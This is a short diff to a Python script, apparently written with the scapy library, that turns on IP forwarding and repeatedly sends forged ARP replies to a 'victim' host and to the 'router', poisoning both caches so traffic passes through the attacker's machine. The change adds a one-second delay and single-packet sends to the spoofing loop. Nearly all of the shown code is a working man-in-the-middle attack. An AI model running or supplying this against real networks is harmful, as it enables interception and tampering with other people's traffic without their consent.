@@ -1,6 +1,7 @@
 from scapy.all import ARP, Ether, srp   
 import scapy.all as scap
 import os
+import time
 
 os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 
 
@@ -30,6 +31,7 @@ router = input()
 
 while True:
     arp_response = ARP(pdst=victim, hwdst=mac[ip.index(victim)], psrc=router)
-    scap.send(arp_response)
+    scap.send(arp_response, count = 1)
     arp_response = ARP(pdst=router, hwdst=mac[ip.index(router)], psrc=victim)
-    scap.send(arp_response)
+    scap.send(arp_response, count = 1)
+    time.sleep(1)
